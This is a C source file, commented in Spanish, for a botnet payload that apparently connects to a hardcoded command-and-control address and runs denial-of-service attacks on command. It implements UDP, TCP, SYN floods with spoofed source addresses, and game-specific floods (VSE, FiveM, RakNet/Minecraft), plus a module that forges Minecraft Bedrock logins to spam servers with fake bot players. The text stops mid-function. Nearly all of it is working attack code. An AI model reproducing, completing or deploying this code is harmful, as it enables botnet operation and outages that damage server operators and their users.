/**
 * payload_fixed.c - Bot para KitsuneC2 con MCBOT real MCPE (VERSIÓN FINAL CORREGIDA)
 * Compilar: gcc -O2 -pthread -o payload payload_fixed.c -lz -lm -lssl -lcrypto
 * 
 * Basado en mcbot.c, con lógica de spam idéntica y todos los métodos de ataque.
 * Corregido: warnings de fgets, snprintf y strncpy.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <math.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <zlib.h>
#include <openssl/evp.h>
#include <openssl/ec.h>
#include <openssl/ecdsa.h>
#include <openssl/sha.h>
#include <openssl/rand.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>
#include <openssl/pem.h>
#include <openssl/x509.h>
#include <openssl/bn.h>

// ─── CONFIGURACIÓN ────────────────────────────────────────────────────────────
#define C2_ADDRESS "45.13.236.245"
#define C2_PORT 26110
#define RECONNECT_DELAY 3
#define MAX_THREADS 8
#define MAX_ATTACKS 50
#define BUFFER_SIZE 4096
#define MAX_PACKET_SIZE 4096
#define MAX_ARGS 16
#define MAX_MCBOT_BOTS 100
#define MAX_MENSAJES 64
#define MAX_MSG_LEN 256

// ─── COLORES ──────────────────────────────────────────────────────────────────
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[1;34m"
#define CYAN    "\033[1;36m"
#define WHITE   "\033[1;37m"
#define GRAY    "\033[0;37m"
#define RESET   "\033[0m"

// ─── ESTRUCTURAS ─────────────────────────────────────────────────────────────
typedef struct {
    char ip[64];
    int port;
    int duration;
    int threads;
    char username[32];
    char method[16];
    time_t start_time;
    int running;
    pthread_t *threads_arr;
    int thread_count;
} Attack;

typedef struct {
    int socket;
    char arch[32];
    char username[32];
    int is_authenticated;
    int should_exit;
} BotClient;

// ─── VARIABLES GLOBALES ──────────────────────────────────────────────────────
Attack *attacks[MAX_ATTACKS];
int attack_count = 0;
pthread_mutex_t attacks_mutex = PTHREAD_MUTEX_INITIALIZER;

int running = 1;
int bot_socket = -1;
int g_mcbot_stop_requested = 0;
int g_tiempo_terminado = 0;

// ─── UTILIDADES ──────────────────────────────────────────────────────────────
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    unsigned short oddbyte;
    register short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return answer;
}

uint32_t get_external_ip(void) {
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) return 0;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

static int64_t now_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (int64_t)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static int64_t now_unix_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    return (int64_t)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static int rand_range(int lo, int hi) {
    if (lo >= hi) return lo;
    return lo + (int)(((double)rand() / RAND_MAX) * (hi - lo + 1));
}

// ─── MÉTODOS DE ATAQUE (L4) ──────────────────────────────────────────────────

void *udp_flood_thread(void *arg) {
    Attack *atk = (Attack *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atk->port);
    target.sin_addr.s_addr = inet_addr(atk->ip);
    
    int packet_size = 512 + (rand() % 1024);
    uint8_t *packet = malloc(packet_size);
    if (!packet) { close(sock); return NULL; }
    
    time_t end = time(NULL) + atk->duration;
    while (atk->running && time(NULL) < end) {
        for (int i = 0; i < packet_size; i++) packet[i] = rand() & 0xFF;
        sendto(sock, packet, packet_size, 0, (struct sockaddr *)&target, sizeof(target));
        usleep(100);
    }
    free(packet);
    close(sock);
    return NULL;
}

void *tcp_flood_thread(void *arg) {
    Attack *atk = (Attack *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atk->port);
    target.sin_addr.s_addr = inet_addr(atk->ip);
    
    int packet_size = 1024 + (rand() % 1024);
    uint8_t *packet = malloc(packet_size);
    if (!packet) return NULL;
    
    time_t end = time(NULL) + atk->duration;
    while (atk->running && time(NULL) < end) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { usleep(10000); continue; }
        fcntl(sock, F_SETFL, O_NONBLOCK);
        connect(sock, (struct sockaddr *)&target, sizeof(target));
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        struct timeval tv = {0, 100000};
        if (select(sock + 1, NULL, &fds, NULL, &tv) > 0) {
            for (int i = 0; i < packet_size; i++) packet[i] = rand() & 0xFF;
            send(sock, packet, packet_size, MSG_NOSIGNAL);
        }
        close(sock);
    }
    free(packet);
    return NULL;
}

void *syn_flood_thread(void *arg) {
    Attack *atk = (Attack *)arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return NULL;
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    uint8_t packet[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atk->port);
    target.sin_addr.s_addr = inet_addr(atk->ip);
    uint32_t src_ip = get_external_ip();
    
    time_t end = time(NULL) + atk->duration;
    while (atk->running && time(NULL) < end) {
        memset(packet, 0, MAX_PACKET_SIZE);
        iph->ihl = 5; iph->version = 4; iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htons(rand() & 0xFFFF); iph->frag_off = 0;
        iph->ttl = 64 + (rand() % 64); iph->protocol = IPPROTO_TCP;
        iph->check = 0; iph->saddr = src_ip ^ (rand() & 0xFFFFFF);
        iph->daddr = target.sin_addr.s_addr;
        iph->check = csum((unsigned short *)packet, sizeof(struct iphdr));
        tcph->source = htons(rand() & 0xFFFF); tcph->dest = htons(atk->port);
        tcph->seq = htonl(rand()); tcph->ack_seq = 0;
        tcph->doff = 5; tcph->syn = 1;
        tcph->window = htons(rand() & 0xFFFF); tcph->check = 0;
        sendto(sock, packet, ntohs(iph->tot_len), 0, (struct sockaddr *)&target, sizeof(target));
        usleep(50);
    }
    close(sock);
    return NULL;
}

void *hex_flood_thread(void *arg) {
    Attack *atk = (Attack *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    uint8_t hex_payload[] = {0x55,0x55,0x55,0x55,0x00,0x00,0x00,0x01};
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atk->port);
    target.sin_addr.s_addr = inet_addr(atk->ip);
    time_t end = time(NULL) + atk->duration;
    while (atk->running && time(NULL) < end) {
        sendto(sock, hex_payload, sizeof(hex_payload), 0, (struct sockaddr *)&target, sizeof(target));
        usleep(100);
    }
    close(sock);
    return NULL;
}

void *vse_flood_thread(void *arg) {
    Attack *atk = (Attack *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    uint8_t vse_payload[] = {0xff,0xff,0xff,0xff,0x54,0x53,0x6f,0x75,0x72,0x63,0x65,0x20,0x45,0x6e,0x67,0x69,0x6e,0x65,0x20,0x51,0x75,0x65,0x72,0x79,0x00};
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atk->port);
    target.sin_addr.s_addr = inet_addr(atk->ip);
    time_t end = time(NULL) + atk->duration;
    while (atk->running && time(NULL) < end) {
        sendto(sock, vse_payload, sizeof(vse_payload), 0, (struct sockaddr *)&target, sizeof(target));
        usleep(100);
    }
    close(sock);
    return NULL;
}

void *mcpe_flood_thread(void *arg) {
    Attack *atk = (Attack *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    uint8_t mcpe_payload[] = {0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                              0x00,0xFF,0xFF,0x00,0xFE,0xFE,0xFE,0xFE,0xFD,0xFD,0xFD,0xFD,0x12,0x34,0x56,0x78};
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atk->port);
    target.sin_addr.s_addr = inet_addr(atk->ip);
    time_t end = time(NULL) + atk->duration;
    while (atk->running && time(NULL) < end) {
        sendto(sock, mcpe_payload, sizeof(mcpe_payload), 0, (struct sockaddr *)&target, sizeof(target));
        usleep(100);
    }
    close(sock);
    return NULL;
}

void *fivem_flood_thread(void *arg) {
    Attack *atk = (Attack *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    uint8_t fivem_payload[] = {0xff,0xff,0xff,0xff,0x67,0x65,0x74,0x69,0x6e,0x66,0x6f,0x20,0x78,0x78,0x78,0x00,0x00,0x00};
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atk->port);
    target.sin_addr.s_addr = inet_addr(atk->ip);
    time_t end = time(NULL) + atk->duration;
    while (atk->running && time(NULL) < end) {
        sendto(sock, fivem_payload, sizeof(fivem_payload), 0, (struct sockaddr *)&target, sizeof(target));
        usleep(100);
    }
    close(sock);
    return NULL;
}

void *udppps_flood_thread(void *arg) {
    Attack *atk = (Attack *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atk->port);
    target.sin_addr.s_addr = inet_addr(atk->ip);
    uint8_t packet[1] = {0x00};
    time_t end = time(NULL) + atk->duration;
    while (atk->running && time(NULL) < end) {
        sendto(sock, packet, 1, 0, (struct sockaddr *)&target, sizeof(target));
        usleep(50);
    }
    close(sock);
    return NULL;
}

void *raknet_flood_thread(void *arg) {
    Attack *atk = (Attack *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atk->port);
    target.sin_addr.s_addr = inet_addr(atk->ip);
    uint8_t magic[] = {0x00,0xff,0xff,0x00,0xfe,0xfe,0xfe,0xfe,0xfd,0xfd,0xfd,0xfd,0x12,0x34,0x56,0x78};
    uint8_t packet[64];
    time_t end = time(NULL) + atk->duration;
    while (atk->running && time(NULL) < end) {
        memset(packet, 0, sizeof(packet));
        packet[0] = 0x01;
        memcpy(packet + 1, magic, 16);
        *(uint64_t *)(packet + 17) = (uint64_t)rand() | ((uint64_t)rand() << 32);
        sendto(sock, packet, 25, 0, (struct sockaddr *)&target, sizeof(target));
        usleep(100);
    }
    close(sock);
    return NULL;
}

void *udpquery_flood_thread(void *arg) {
    Attack *atk = (Attack *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atk->port);
    target.sin_addr.s_addr = inet_addr(atk->ip);
    const char *queries[] = {"GET / HTTP/1.1\r\n\r\n","POST /api HTTP/1.1\r\n\r\n","SELECT * FROM users","CONNECT server:443\r\n\r\n","OPTIONS * HTTP/1.1\r\n\r\n","PING\r\n","TIME "};
    time_t end = time(NULL) + atk->duration;
    while (atk->running && time(NULL) < end) {
        int idx = rand() % 7;
        sendto(sock, queries[idx], strlen(queries[idx]), 0, (struct sockaddr *)&target, sizeof(target));
        usleep(100);
    }
    close(sock);
    return NULL;
}

void *udpkill_flood_thread(void *arg) {
    Attack *atk = (Attack *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atk->port);
    target.sin_addr.s_addr = inet_addr(atk->ip);
    uint8_t packet[1400];
    time_t end = time(NULL) + atk->duration;
    while (atk->running && time(NULL) < end) {
        for (int i = 0; i < 1400; i++) packet[i] = rand() & 0xFF;
        sendto(sock, packet, 1400, 0, (struct sockaddr *)&target, sizeof(target));
        usleep(50);
    }
    close(sock);
    return NULL;
}

void *udpbypass_flood_thread(void *arg) {
    Attack *atk = (Attack *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atk->port);
    target.sin_addr.s_addr = inet_addr(atk->ip);
    uint8_t base[] = {0x05,0x00,0xff,0xff,0x00,0xfe,0xfe,0xfe,0xfe,0xfd,0xfd,0xfd,0xfd,0x12,0x34,0x56,0x78,0x08};
    uint8_t packet[MAX_PACKET_SIZE];
    time_t end = time(NULL) + atk->duration;
    while (atk->running && time(NULL) < end) {
        memcpy(packet, base, 18);
        packet[18] = rand() & 0xFF; packet[19] = rand() & 0xFF; packet[20] = rand() & 0xFF;
        memset(packet + 21, 0, MAX_PACKET_SIZE - 21);
        sendto(sock, packet, MAX_PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
        usleep(100);
    }
    close(sock);
    return NULL;
}

void *udpfrag_flood_thread(void *arg) {
    Attack *atk = (Attack *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atk->port);
    target.sin_addr.s_addr = inet_addr(atk->ip);
    time_t end = time(NULL) + atk->duration;
    while (atk->running && time(NULL) < end) {
        int frag_count = 5 + (rand() % 20);
        for (int i = 0; i < frag_count; i++) {
            int frag_size = 8 + (rand() % 1500);
            uint8_t *fragment = malloc(frag_size);
            if (!fragment) break;
            for (int j = 0; j < frag_size; j++) fragment[j] = rand() & 0xFF;
            sendto(sock, fragment, frag_size, 0, (struct sockaddr *)&target, sizeof(target));
            free(fragment);
        }
        usleep(1000);
    }
    close(sock);
    return NULL;
}

void *mix_flood_thread(void *arg) {
    Attack *atk = (Attack *)arg;
    int udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    int tcp_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (udp_sock < 0 || tcp_sock < 0) {
        if (udp_sock >= 0) close(udp_sock);
        if (tcp_sock >= 0) close(tcp_sock);
        return NULL;
    }
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atk->port);
    target.sin_addr.s_addr = inet_addr(atk->ip);
    uint8_t packet[1024];
    time_t end = time(NULL) + atk->duration;
    while (atk->running && time(NULL) < end) {
        for (int i = 0; i < 1024; i++) packet[i] = rand() & 0xFF;
        if (rand() % 2 == 0) {
            sendto(udp_sock, packet, 1024, 0, (struct sockaddr *)&target, sizeof(target));
        } else {
            fcntl(tcp_sock, F_SETFL, O_NONBLOCK);
            connect(tcp_sock, (struct sockaddr *)&target, sizeof(target));
            fd_set fds; FD_ZERO(&fds); FD_SET(tcp_sock, &fds);
            struct timeval tv = {0, 100000};
            if (select(tcp_sock + 1, NULL, &fds, NULL, &tv) > 0) {
                send(tcp_sock, packet, 1024, MSG_NOSIGNAL);
            }
            close(tcp_sock);
            tcp_sock = socket(AF_INET, SOCK_STREAM, 0);
            if (tcp_sock < 0) { close(udp_sock); return NULL; }
        }
        usleep(100);
    }
    close(udp_sock); close(tcp_sock);
    return NULL;
}

// ═══════════════════════════════════════════════════════════════════════════
// MCBOT COMPLETO INTEGRADO (con lógica de spam IDÉNTICA a mcbot.c)
// ═══════════════════════════════════════════════════════════════════════════

// ─── Constantes MCBOT ──────────────────────────────────────────────────────
#define MTU_LIST_SIZE 6
#define MAX_NOMBRE_LEN 64
#define FRAME_STORE_MAX 2048
#define SPLIT_MAP_MAX 256
#define SPLIT_PARTS_MAX 128

static const int MTU_LIST[MTU_LIST_SIZE] = { 1447, 1492, 1464, 1400, 1200, 576 };

static const uint8_t MAGIC_MC[16] = {
    0x00,0xFF,0xFF,0x00,0xFE,0xFE,0xFE,0xFE,
    0xFD,0xFD,0xFD,0xFD,0x12,0x34,0x56,0x78,
};

#define RAK_PING_UNCONN_MC  0x01
#define RAK_PONG_UNCONN_MC  0x1C
#define RAK_OPEN_REQ_1_MC   0x05
#define RAK_OPEN_REPLY_1_MC 0x06
#define RAK_OPEN_REQ_2_MC   0x07
#define RAK_OPEN_REPLY_2_MC 0x08
#define RAK_CONN_REQ_MC     0x09
#define RAK_NEW_INC_CONN_MC 0x10
#define RAK_DISCONN_MC      0x15
#define RAK_CONN_PING_MC    0x00
#define RAK_CONN_PONG_MC    0x03
#define RAK_ACK_MC          0xC0
#define RAK_NACK_MC         0xA0

#define P70_LOGIN_MC        0x8f
#define P70_PLAY_STATUS_MC  0x90
#define P70_DISCONNECT_MC   0x91
#define P70_BATCH_MC        0x92
#define P70_TEXT_MC         0x93
#define P70_START_GAME_MC   0x95

#define P84_LOGIN_MC        0x01
#define P84_PLAY_STATUS_MC  0x02
#define P84_SERVER_HS_MC    0x03
#define P84_CLIENT_HS_MC    0x04
#define P84_DISCONNECT_MC   0x05
#define P84_RSPACK_INFO_MC  0x06
#define P84_RSPACK_STACK_MC 0x07
#define P84_RSPACK_RESP_MC  0x08
#define P84_TEXT_MC         0x09
#define P84_SET_TIME_MC     0x0a
#define P84_START_GAME_MC   0x0b
#define P84_MOVE_PLAYER_MC  0x13
#define P84_RESPAWN_MC      0x2d
#define P84_CHUNK_RADIUS_MC 0x45
#define P84_CHUNK_RAD_UPD_MC 0x46

// ─── Mensajes (igual que mcbot.c) ──────────────────────────────────────────
static char MENSAJES[MAX_MENSAJES][MAX_MSG_LEN];
static int MENSAJES_COUNT = 0;
static int g_global_msg_idx = 0;

// ─── Estructuras MCBOT ──────────────────────────────────────────────────────
typedef enum {
    PHASE_UNCONNECTED_MC = 0,
    PHASE_CONNECTING_1_MC,
    PHASE_CONNECTING_2_MC,
    PHASE_HANDSHAKING_MC,
    PHASE_LOGIN_MC,
    PHASE_GAME_MC,
} PhaseMC;

typedef struct {
    uint32_t seq;
    uint8_t *data;
    size_t len;
} SentFrameMC;

typedef struct {
    int used;
    uint16_t split_id;
    uint32_t count;
    uint8_t *parts[SPLIT_PARTS_MAX];
    size_t part_lens[SPLIT_PARTS_MAX];
    int filled;
} SplitEntryMC;

typedef struct MCBot {
    int id;
    char nombre[MAX_NOMBRE_LEN];
    char uuid[64];
    char xuid[32];
    PhaseMC phase;
    uint64_t client_id;
    int mtu_size;
    int mtu_idx;
    int mtu_sent;
    uint64_t server_guid;
    uint32_t send_seq;
    uint32_t msg_index;
    uint32_t order_index;
    uint16_t split_id_counter;
    uint32_t ack_queue[4096];
    int ack_queue_len;
    SplitEntryMC split_map[SPLIT_MAP_MAX];
    SentFrameMC sent_frames[FRAME_STORE_MAX];
    int sent_frames_count;
    int64_t entity_id;
    int proto;
    int variant_a;
    int spawned;
    int connected;
    int is_closing;
    int sockfd;
    struct sockaddr_in server_addr;
    char host[256];
    int port;
    char mensajes[1024];
    int intervalo;
    int running;
    pthread_t thread;
    // Timers
    int64_t t_keepalive;
    int64_t t_chat;
    int64_t t_register;
    int64_t t_mtu_retry;
    int64_t t_req2_retry;
    int64_t t_spawn_fallback;
    int64_t t_spawn_timeout;
    int64_t t_move;
    int64_t t_start_move_chat;
    // Otros
    int req2_attempt;
    int msg_idx;
    float pos_x, pos_y, pos_z;
    float pos_yaw, pos_pitch, pos_headyaw;
    float velocity_y;
    int on_ground;
    int register_sent;
    char register_cmd[256];
    uint8_t unk_seen[256];
    float move_ox, move_oy, move_oz;
    float move_dir;
    int move_state;
    int spawned_ok;
    int _spawnTimeout_consumed;
    int rpack_resp_sent;
    int rpack_done;
} MCBot;

static MCBot *g_mcbots[MAX_MCBOT_BOTS];
static int g_mcbot_count = 0;
static pthread_mutex_t g_mcbot_mutex = PTHREAD_MUTEX_INITIALIZER;

// ─── Writer MCBOT ──────────────────────────────────────────────────────────
typedef struct {
    uint8_t *data;
    size_t len;
    size_t cap;
} BufMC;

static void buf_init_mc(BufMC *b) { b->cap = 256; b->data = (uint8_t *)malloc(b->cap); b->len = 0; }
static void buf_free_mc(BufMC *b) { free(b->data); b->data = NULL; b->len = b->cap = 0; }
static void buf_ensure_mc(BufMC *b, size_t extra) {
    if (b->len + extra <= b->cap) return;
    while (b->len + extra > b->cap) b->cap *= 2;
    b->data = (uint8_t *)realloc(b->data, b->cap);
}
static void w_u8_mc(BufMC *b, uint8_t v) { buf_ensure_mc(b, 1); b->data[b->len++] = v; }
static void w_u16be_mc(BufMC *b, uint16_t v) { buf_ensure_mc(b, 2); b->data[b->len++] = (v >> 8) & 0xFF; b->data[b->len++] = v & 0xFF; }
static void w_u32be_mc(BufMC *b, uint32_t v) { buf_ensure_mc(b, 4); b->data[b->len++] = (v >> 24) & 0xFF; b->data[b->len++] = (v >> 16) & 0xFF; b->data[b->len++] = (v >> 8) & 0xFF; b->data[b->len++] = v & 0xFF; }
static void w_i32be_mc(BufMC *b, int32_t v) { w_u32be_mc(b, (uint32_t)v); }
static void w_i32le_mc(BufMC *b, int32_t v) { buf_ensure_mc(b, 4); uint32_t u = (uint32_t)v; b->data[b->len++] = u & 0xFF; b->data[b->len++] = (u >> 8) & 0xFF; b->data[b->len++] = (u >> 16) & 0xFF; b->data[b->len++] = (u >> 24) & 0xFF; }
static void w_u64be_mc(BufMC *b, uint64_t v) { buf_ensure_mc(b, 8); for (int i = 7; i >= 0; i--) b->data[b->len++] = (v >> (i*8)) & 0xFF; }
static void w_i64be_mc(BufMC *b, int64_t v) { w_u64be_mc(b, (uint64_t)v); }
static void w_f32be_mc(BufMC *b, float v) { uint32_t u; memcpy(&u, &v, 4); w_u32be_mc(b, u); }
static void w_tLE_mc(BufMC *b, uint32_t v) { buf_ensure_mc(b, 3); b->data[b->len++] = v & 0xFF; b->data[b->len++] = (v >> 8) & 0xFF; b->data[b->len++] = (v >> 16) & 0xFF; }
static void w_raw_mc(BufMC *b, const uint8_t *data, size_t len) { buf_ensure_mc(b, len); memcpy(b->data + b->len, data, len); b->len += len; }
static void w_magic_mc(BufMC *b) { w_raw_mc(b, MAGIC_MC, 16); }
static void w_str_mc(BufMC *b, const char *s) { size_t l = strlen(s); w_u16be_mc(b, (uint16_t)l); w_raw_mc(b, (const uint8_t *)s, l); }
static void w_std_ip_mc(BufMC *b, const char *ip, uint16_t port) {
    w_u8_mc(b, 4);
    char tmp[256]; 
    strncpy(tmp, ip, sizeof(tmp)-1);
    tmp[sizeof(tmp)-1] = '\0';
    char *p = tmp, *tok;
    while ((tok = strsep(&p, "."))) { w_u8_mc(b, atoi(tok) & 0xFF); }
    w_u16be_mc(b, port);
}
static void w_varint_mc(BufMC *b, uint32_t v) {
    do {
        uint8_t x = v & 0x7F; v >>= 7;
        if (v) x |= 0x80;
        w_u8_mc(b, x);
    } while (v);
}

// ─── Base64 y JWT (igual que en mcbot.c) ──────────────────────────────────
static char *base64_encode_mc(const uint8_t *data, size_t len) {
    BIO *b64 = BIO_new(BIO_f_base64());
    BIO *mem = BIO_new(BIO_s_mem());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    b64 = BIO_push(b64, mem);
    BIO_write(b64, data, (int)len);
    BIO_flush(b64);
    BUF_MEM *bptr;
    BIO_get_mem_ptr(b64, &bptr);
    char *out = (char *)malloc(bptr->length + 1);
    memcpy(out, bptr->data, bptr->length);
    out[bptr->length] = '\0';
    BIO_free_all(b64);
    return out;
}

static EVP_PKEY *g_ec_key_mc = NULL;

static void init_ec_key_mc(void) {
    if (g_ec_key_mc) return;
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_EC, NULL);
    if (!ctx) return;
    if (EVP_PKEY_keygen_init(ctx) <= 0) { EVP_PKEY_CTX_free(ctx); return; }
    if (EVP_PKEY_CTX_set_ec_paramgen_curve_nid(ctx, NID_secp384r1) <= 0) {
        EVP_PKEY_CTX_free(ctx); return;
    }
    EVP_PKEY_keygen(ctx, &g_ec_key_mc);
    EVP_PKEY_CTX_free(ctx);
}

static char *pub_key_b64_mc(void) {
    if (!g_ec_key_mc) return strdup("AAAA");
    unsigned char *der = NULL;
    int derlen = i2d_PUBKEY(g_ec_key_mc, &der);
    if (derlen <= 0) return strdup("AAAA");
    char *out = base64_encode_mc(der, derlen);
    OPENSSL_free(der);
    return out;
}

static void b64url_from_bytes_mc(const uint8_t *data, size_t len, char *out, size_t outsize) {
    char *b64 = base64_encode_mc(data, len);
    size_t j = 0;
    for (size_t i = 0; b64[i] && j + 1 < outsize; i++) {
        char c = b64[i];
        if (c == '+') c = '-';
        else if (c == '/') c = '_';
        else if (c == '=') continue;
        out[j++] = c;
    }
    out[j] = '\0';
    free(b64);
}

static void b64url_from_json_mc(const char *json, char *out, size_t outsize) {
    b64url_from_bytes_mc((const uint8_t *)json, strlen(json), out, outsize);
}

static int der_to_raw_mc(const uint8_t *der, int derlen, uint8_t *out96) {
    memset(out96, 0, 96);
    if (derlen < 6) return 0;
    int off = 2;
    int rL = der[off + 1]; off += 2;
    const uint8_t *rR = der + off; off += rL;
    int sL = der[off + 1]; off += 2;
    const uint8_t *sR = der + off;
    const uint8_t *rt = rR; int rtl = rL;
    if (rtl > 0 && rt[0] == 0) { rt++; rtl--; }
    const uint8_t *st = sR; int stl = sL;
    if (stl > 0 && st[0] == 0) { st++; stl--; }
    if (rtl > 48 || stl > 48) return 0;
    memcpy(out96 + 48 - rtl, rt, rtl);
    memcpy(out96 + 96 - stl, st, stl);
    return 1;
}

static char *make_jwt_mc(const char *payload_json) {
    char *pub = pub_key_b64_mc();
    char hdr_json[1024];
    snprintf(hdr_json, sizeof(hdr_json), "{\"alg\":\"ES384\",\"x5u\":\"%s\"}", pub);
    free(pub);
    char hdr_b64[4096], pay_b64[65536];
    b64url_from_json_mc(hdr_json, hdr_b64, sizeof(hdr_b64));
    b64url_from_json_mc(payload_json, pay_b64, sizeof(pay_b64));
    size_t data_len = strlen(hdr_b64) + 1 + strlen(pay_b64) + 1;
    char *data = (char *)malloc(data_len);
    snprintf(data, data_len, "%s.%s", hdr_b64, pay_b64);
    if (!g_ec_key_mc) {
        char *jwt = (char *)malloc(strlen(data) + 8);
        sprintf(jwt, "%s.AAAAAA", data);
        free(data);
        return jwt;
    }
    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    EVP_DigestSignInit(mdctx, NULL, EVP_sha384(), NULL, g_ec_key_mc);
    EVP_DigestSignUpdate(mdctx, data, strlen(data));
    size_t siglen = 0;
    EVP_DigestSignFinal(mdctx, NULL, &siglen);
    uint8_t *sig = (uint8_t *)malloc(siglen);
    EVP_DigestSignFinal(mdctx, sig, &siglen);
    EVP_MD_CTX_free(mdctx);
    uint8_t raw96[96];
    der_to_raw_mc(sig, (int)siglen, raw96);
    free(sig);
    char sig_b64[256];
    b64url_from_bytes_mc(raw96, 96, sig_b64, sizeof(sig_b64));
    size_t jwt_len = strlen(data) + 1 + strlen(sig_b64) + 1;
    char *jwt = (char *)malloc(jwt_len);
    snprintf(jwt, jwt_len, "%s.%s", data, sig_b64);
    free(data);
    return jwt;
}

// ─── Utilidades MCBOT (igual que mcbot.c) ──────────────────────────────────
static void random_name_mc(const char *base, char *out, size_t outsize) {
    const char *names[] = {"ProPlayer","xXDarkXx","Minecrafter","CraftKing","PixelWarrior",
        "DiamondHunt","RedstonePro","BuildMaster","SurvivalGuy","PvP_Legend",NULL};
    int count = 0; while (names[count]) count++;
    if (base && strlen(base) > 0 && strcmp(base,"Bot") && strcmp(base,"Steve")) {
        snprintf(out, outsize, "%s%d", base, rand() % 999);
        return;
    }
    int idx = rand() % count;
    snprintf(out, outsize, "%s%d", names[idx], rand() % 999);
}

static void random_pass_mc(char *out, size_t outsize) {
    const char *c = "abcdefghijklmnopqrstuvwxyz0123456789";
    int n = (int)strlen(c);
    for (int i = 0; i < 8 && i + 1 < (int)outsize; i++)
        out[i] = c[rand() % n];
    out[8 < (int)outsize ? 8 : (int)outsize - 1] = '\0';
}

static void random_xuid_mc(char *out, size_t outsize) {
    snprintf(out, outsize, "25%014lld", (long long)(rand() % 100000000000000LL));
}

static void random_uuid_mc(char *out, size_t outsize) {
    uint8_t b[16];
    RAND_bytes(b, 16);
    b[6] = (b[6] & 0x0F) | 0x40;
    b[8] = (b[8] & 0x3F) | 0x80;
    snprintf(out, outsize,
        "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        b[0],b[1],b[2],b[3],b[4],b[5],b[6],b[7],
        b[8],b[9],b[10],b[11],b[12],b[13],b[14],b[15]);
}

static char *build_fallback_skin_mc(void) {
    uint8_t buf[64 * 64 * 4];
    memset(buf, 0, sizeof(buf));
    for (int y = 0; y < 64; y++) {
        for (int x = 0; x < 64; x++) {
            int i = (y * 64 + x) * 4;
